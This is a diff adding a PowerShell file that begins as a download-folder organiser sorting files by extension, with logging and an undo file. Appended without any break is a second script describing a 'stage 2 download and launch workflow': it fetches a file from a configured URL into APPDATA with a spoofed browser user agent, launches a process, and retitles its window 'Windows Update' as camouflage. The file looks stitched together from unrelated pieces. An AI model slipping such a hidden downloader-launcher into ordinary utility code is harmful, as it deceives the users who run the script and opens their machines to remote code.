@@ -1,0 +1,260 @@
+<#
+.SYNOPSIS
+    Moves files from a drop folder into per-type destination folders.
+.DESCRIPTION
+    Reads an extension map, creates the destination folders and moves each file
+    into the matching folder without overwriting an existing name.
+    The DryRun switch prints the planned moves and leaves the source folder
+    untouched, which is the default for the first run on a new machine.
+.EXAMPLE
+    .\Sort-Downloads.ps1 -SourcePath C:\Users\Public\Documents\Inbox
+#>
+
+$SourcePath      = "C:\Users\Public\Documents\Inbox"
+$DestinationRoot = 'E:\SortedFiles'
+$LogPath         = 'C:\Logs\organise-2024-10-27.log'
+$DryRun          = $false
+$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
+$hostName = $env:COMPUTERNAME
+$InformationPreference = 'SilentlyContinue'
+
+$map = @{
+    '.pdf'  = 'Documents'
+    '.docx' = 'Documents'
+    '.xlsx' = 'Spreadsheets'
+    '.png'  = 'Images'
+    '.jpg'  = 'Images'
+    '.zip'  = 'Archives'
+    '.log'  = 'Logs'
+}
+$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
+    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
+$moved = @()
+foreach ($file in $files) {
+    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
+    if (-not (Test-Path -LiteralPath $folder)) {
+        New-Item -ItemType Directory -Path $folder -Force | Out-Null
+    }
+    $target = Join-Path $folder $file.Name
+    if (Test-Path -LiteralPath $target) {
+        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
+        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
+    }
+    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
+    $moved += [pscustomobject]@{
+        Source  = $file.FullName
+        Target  = $target
+        MovedAt = Get-Date
+    }
+}
+
+$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
+    Sort-Object -Property Count -Descending
+$byFolder | Format-Table Name, Count -AutoSize
+
+$sizes = $files | Measure-Object -Property Length -Sum
+Write-Verbose ("Total size: {0:N1} MB" -f ($sizes.Sum / 1MB))
+
+$undoPath = $LogPath.Replace('.log', '-undo.csv')
+$moved | Export-Csv -Path $undoPath -NoTypeInformation -Encoding UTF8
+Write-Verbose ("Undo file: {0}" -f $undoPath)
+
+$duplicates = $files | Group-Object -Property Name | Where-Object { $_.Count -gt 1 }
+if (@($duplicates).Count -gt 0) {
+    Write-Warning ("Duplicate file names in source: {0}" -f @($duplicates).Count)
+}
+$skipped = @(Get-ChildItem -LiteralPath $SourcePath -File |
+    Where-Object { -not $map.ContainsKey($_.Extension.ToLower()) }).Count
+Write-Verbose ("Skipped unknown extensions: {0}" -f $skipped)
+
+$style = @'
+<style>
+body { font-family: Tahoma; font-size: 12px; }
+table { border-collapse: collapse; width: 100%; }
+th { background: #e8eef7; text-align: left; padding: 4px; }
+td { border-bottom: 1px solid #dddddd; padding: 4px; }
+</style>
+'@
+
+$byFolder | ConvertTo-Html -Title 'Organiser summary' -Head $style |
+    Set-Content -Path $LogPath.Replace('.log', '.html') -Encoding UTF8
+
+$logLine = "{0} organised {1} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), @($moved).Count
+Add-Content -Path $LogPath -Value $logLine -Encoding UTF8
+Write-Host ("Organiser finished: {0} files" -f @($moved).Count) -ForegroundColor Green
+
+$freeSpace = Get-PSDrive -Name ($DestinationRoot.Substring(0, 1)) -ErrorAction SilentlyContinue
+if ($freeSpace) {
+    Write-Verbose ("Destination free space: {0} GB" -f [math]::Round($freeSpace.Free / 1GB, 1))
+}
+
+$hashList = foreach ($item in $files | Select-Object -First 10) {
+    [pscustomobject]@{ Name = $item.Name; Hash = (Get-FileHash -LiteralPath $item.FullName -Algorithm SHA256).Hash }
+}
+$hashList | Format-Table Name -AutoSize
+
+$largeFiles = $files | Sort-Object -Property Length -Descending | Select-Object -First 5
+$largeFiles | Format-Table Name, @{Name = 'SizeMB'; Expression = { [math]::Round($_.Length / 1MB, 2) }} -AutoSize
+
+$emptyFolders = Get-ChildItem -LiteralPath $SourcePath -Directory -Force |
+    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force).Count -eq 0 }
+Write-Verbose ("Empty source folders: {0}" -f @($emptyFolders).Count)
+
+$oldFiles = Get-ChildItem -LiteralPath $SourcePath -File |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-90) }
+Write-Verbose ("Files older than 90 days: {0}" -f @($oldFiles).Count)
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isElevated) {
+    Write-Warning 'Some checks require an elevated session.'
+}
+
+$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
+    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
+foreach ($dir in $staleTemp) {
+    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+$runningAsService = $env:SESSIONNAME -eq 'Services'
+Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
+Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
+
+$culture = [System.Globalization.CultureInfo]::CurrentCulture
+Write-Verbose ("Culture: {0}" -f $culture.Name)
+Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)
+
+$osVersion = [System.Environment]::OSVersion.VersionString
+Write-Verbose ("Operating system: {0}" -f $osVersion)
+Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
+
+$logFolder = Join-Path $env:TEMP 'ops-logs'
+if (-not (Test-Path -LiteralPath $logFolder)) {
+    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
+}
+Write-Verbose ("Log folder: {0}" -f $logFolder)
+
+$elapsed = (Get-Date) - (Get-Date).Date
+Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)
+
+$powerShellHome = $PSHOME
+Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
+<#
+.SYNOPSIS
+    Structured stage 2 download and launch workflow.
+
+.DESCRIPTION
+    Resolves a configured endpoint, downloads the staged artefact
+    with a bounded retry loop, validates the result and then hands
+    control to the launcher.
+
+.NOTES
+    Designed for unattended execution.
+
+.EXAMPLE
+    PS> .\loader.ps1
+#>
+[CmdletBinding()]
+param(
+    [string]$PayloadUrl = "https://localhost:8080/stage2.ps1",
+    [string]$WorkingPath = "$env:APPDATA\stage2.bin",
+    [string]$TracePath = "$env:TEMP\telemetry.json",
+    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    [int]$StageTimeout = 223,
+    [int]$RetryCount = 1,
+    [int]$RetryDelay = 7
+)
+$ErrorActionPreference = "Stop"
+$ProgressPreference = "SilentlyContinue"
+
+# Diagnostic logging
+function Write-StageLog {
+    [CmdletBinding()]
+    param(
+        [string]$Message = ""
+    )
+
+    Write-Verbose $Message
+    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
+}
+
+# Endpoint resolution
+function Resolve-StageEndpoint {
+    [CmdletBinding()]
+    param(
+        [string]$CandidateUrl = ""
+    )
+
+    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
+        throw "Endpoint URL is empty"
+    }
+    $ParsedUri = [System.Uri]$CandidateUrl
+    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
+    return $ParsedUri.AbsoluteUri
+}
+
+# Retrying transfer
+function Invoke-Stage2Download {
+    [CmdletBinding()]
+    param(
+        [string]$SourceUrl = '',
+        [string]$DestinationPath = '',
+        [int]$RetryCount = 1,
+        [int]$RetryDelay = 7,
+        [string]$UserAgent = 'Mozilla/5.0'
+    )
+
+    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
+        try {
+            $ClientObject = New-Object System.Net.WebClient
+            $ClientObject.Headers.Add("User-Agent", $UserAgent)
+            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
+            return $true
+        }
+        catch {
+            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
+            Start-Sleep -Seconds $RetryDelay
+        }
+    }
+    return $false
+}
+
+try {
+    Write-StageLog -Message "Starting stage 2 download"
+    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $PayloadUrl
+    $TransferResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $WorkingPath -RetryCount $RetryCount -RetryDelay $RetryDelay -UserAgent $UserAgent
+    if ($TransferResult) {
+        Write-StageLog -Message "Stage 2 downloaded"
+        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
+    }
+    else {
+        Write-Warning "Stage 2 transfer did not complete"
+    }
+}
+catch {
+    Write-Warning "Structured download failed: $($_.Exception.Message)"
+}
+
+$DiagnosticReport = [ordered]@{
+    Stage = "stage2"
+    Endpoint = $PayloadUrl
+    Destination = $WorkingPath
+    RetryCount = $RetryCount
+    TimeoutSec = $StageTimeout
+}
+$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
+Write-Verbose "Preparing working directory"
+Write-Verbose "Stage handoff finished"
+Write-Verbose "Validating result"
+Write-Verbose "Resolving configured target"
+Write-Verbose "Reading configuration values"
+Write-Verbose "Cleaning temporary marker"
+Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
+$Host.UI.RawUI.WindowTitle = "Windows Update"
+Write-Output "stage 31 initialized"
